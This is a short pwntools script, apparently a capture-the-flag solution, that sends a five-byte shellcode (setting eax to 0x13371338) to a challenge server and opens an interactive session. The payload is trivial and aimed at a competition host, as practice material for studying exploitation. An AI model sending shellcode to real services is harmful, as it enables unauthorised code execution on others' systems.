from pwn import *

shellcode = b'\xb8\x38\x13\x37\x13'  # mov eax, 0x13371338
conn = remote("shellone.pwn.ccit25.chals.havce.it", 1337)
conn.send(shellcode)
conn.interactive()
